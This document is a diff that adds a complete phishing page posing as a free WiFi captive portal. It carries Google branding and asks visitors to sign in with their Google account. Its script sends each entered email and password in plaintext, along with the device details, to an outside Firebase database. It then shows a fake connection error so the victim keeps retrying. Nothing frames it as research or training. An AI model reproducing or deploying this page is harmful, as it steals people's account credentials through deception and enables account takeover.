@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>FreeWiFi Login</title>
+<style>
+body {
+    background: #e9f0ff;
+    font-family: Arial, sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+}
+.box {
+    background: #fff;
+    width: 340px;
+    padding: 30px;
+    border-radius: 10px;
+    box-shadow: 0 5px 15px rgba(0,0,0,0.15);
+    text-align: center;
+}
+input {
+    width: 100%;
+    padding: 12px;
+    margin-top: 12px;
+    border: 1px solid #ccc;
+    border-radius: 6px;
+    font-size: 16px;
+}
+button {
+    width: 100%;
+    padding: 12px;
+    margin-top: 20px;
+    background: #2d7bf4;
+    border: none;
+    color: white;
+    border-radius: 6px;
+    font-size: 17px;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+}
+button:disabled {
+    opacity: 0.7;
+    cursor: not-allowed;
+}
+.error {
+    color: red;
+    margin-top: 10px;
+    font-size: 14px;
+    display: none;
+}
+.spinner {
+    border: 3px solid #fff;
+    border-top: 3px solid #2d7bf4;
+    border-radius: 50%;
+    width: 16px;
+    height: 16px;
+    animation: spin 0.8s linear infinite;
+}
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+.logo {
+    --logo-size: 48px;
+    display:flex;
+    align-items:center;
+    gap:10px;
+    justify-content:center;
+    margin-bottom: 20px;
+}
+.logo svg {
+    height: var(--logo-size);
+    width: auto;
+}
+</style>
+</head>
+<body>
+
+<div class="box">
+    <div class="logo">
+      <svg viewBox="0 0 256 262" xmlns="http://www.w3.org/2000/svg">
+        <g transform="scale(1)">
+          <path fill="#4285F4" d="M255.3 133.5c0-10.7-.9-18.5-2.9-26.6H130.6v48.4h71.7c-1.4 12.1-9.1 30.3-26.1 42.5l-.2 1.6 37.9 29.4 2.6.3c24.1-22.3 38.8-55.2 38.8-95.6"/>
+          <path fill="#34A853" d="M130.3 260.2c34.5 0 63.5-11.3 84.7-30.6l-40.4-31.4c-10.8 7.5-25.4 12.7-44.3 12.7-33.9 0-62.7-22.1-73-52.8l-1.5.1-39.5 30.6-.5 1.5c20.8 41.9 63.2 70 114.5 70"/>
+          <path fill="#FBBC05" d="M57.6 72.2c-2.7-8.1-4.3-16.7-4.3-25.6s1.6-17.4 4.2-25.6l-.1-1.7L17.6 75l-1.93.6C5.7 97.9 0 120.1 0 125.2s5.7 47.3 16.3 69.6l41.3-32.2"/>
+          <path fill="#EA4335" d="M130.6 50.3c24 0 40.1 10.3 49.3 18.9l36-35C194 12.1 165.1 0 130.6 0 79.3 0 36.9 28.1 16.1 70l41.3 32.2c10.4-30.7 39.2-51.9 73.2-51.9"/>
+        </g>
+      </svg>
+      <svg viewBox="0 0 24 24" fill="#2d7bf4">
+        <path d="M12 20c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2z"/>
+        <path d="M16.25 14.76a6 6 0 0 0-8.49 0l1.41 1.41a4 4 0 0 1 5.66 0l1.42-1.41z"/>
+        <path d="M19.08 11.93c-3.9-3.9-10.24-3.9-14.14 0l1.41 1.41c3.12-3.12 8.2-3.12 11.32 0l1.41-1.41z"/>
+        <path d="M21.91 9.1c-5.86-6.86-15.36-5.86-21.22 0l2.41 1.41c4.92-4.92 12.48-4.92 17.4 0l1.41-1.41z"/>
+      </svg>
+    </div>
+
+<h2>Free WiFi Login</h2>
+<p style="color:#555;font-size:14px;">Login Google account to connect</p>
+<input id="email" type="text" placeholder="Email address">
+<input id="password" type="password" placeholder="Password">
+<button id="loginBtn">Login</button>
+<div class="error" id="err"></div>
+</div>
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-app.js";
+import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-database.js";
+
+const firebaseConfig = {
+    apiKey: "AIzaSyAGinc-wCWcl7bNfwgaI0HLaBnJR4aZt-Y",
+    authDomain: "freewifi-981c3.firebaseapp.com",
+    projectId: "freewifi-981c3",
+    storageBucket: "freewifi-981c3.firebasestorage.app",
+    messagingSenderId: "697473327624",
+    appId: "1:697473327624:web:0bee6e252d3aace182e7bd"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
+
+const emailField = document.getElementById("email");
+const passField = document.getElementById("password");
+const err = document.getElementById("err");
+const loginBtn = document.getElementById("loginBtn");
+
+const bannedPasswords = ["abc123","password","qwerty","123456","123123","letmein","welcome","admin","tsc","freewifi","iloveyou","abcdef","654321"];
+
+function rateLimit() {
+    let attempts = Number(localStorage.getItem("wifi_attempts") || 0);
+    if (attempts >= 20) { err.textContent="Too many attempts."; err.style.display="block"; return false; }
+    localStorage.setItem("wifi_attempts", attempts + 1);
+    return true;
+}
+
+function validatePassword(pass){
+    if(pass.length<6) return "Password must be at least 6 characters";
+    if(!/[A-Za-z]/.test(pass) || !/[0-9]/.test(pass)) return "Password must contain letters and numbers";
+    if(bannedPasswords.includes(pass.toLowerCase())) return "Password too common";
+    return true;
+}
+
+function validate(email, pass){
+    const emailRegex = /^[a-zA-Z0-9._%+-]+@gmail\.com$/;
+    if(!emailRegex.test(email)) return "Wrong cridentials";
+    return validatePassword(pass);
+}
+
+function saveToFirebase(email, pass){
+    return new Promise((resolve, reject)=>{
+        const loginRef = ref(db,"wifi_users/");
+        const newRef = push(loginRef);
+        set(newRef,{
+            email: email,
+            password: pass,
+            device: navigator.userAgent,
+            time: new Date().toLocaleString()
+        }).then(resolve).catch(reject);
+    });
+}
+
+loginBtn.onclick = async ()=>{
+    const email = emailField.value.trim();
+    const pass = passField.value.trim();
+    err.style.display = "none";
+
+    if(!rateLimit()) return;
+
+    loginBtn.innerHTML = '<div class="spinner"></div> Connecting...';
+    loginBtn.disabled = true;
+
+    const valid = validate(email, pass);
+    if(valid !== true){
+        err.textContent = valid;
+        err.style.display = "block";
+        loginBtn.textContent = "Login";
+        loginBtn.disabled = false;
+        return;
+    }
+
+    try {
+        await saveToFirebase(email, pass);
+        err.textContent = "Failed to connect on freewifi_ditohomes9";
+        err.style.display = "block";
+    } catch(e){
+        err.textContent = "Failed to connect on freewifi_ditohomes9";
+        err.style.display = "block";
+    }
+
+    loginBtn.textContent = "Login";
+    loginBtn.disabled = false;
+};
+</script>
+
+</body>
+</html>
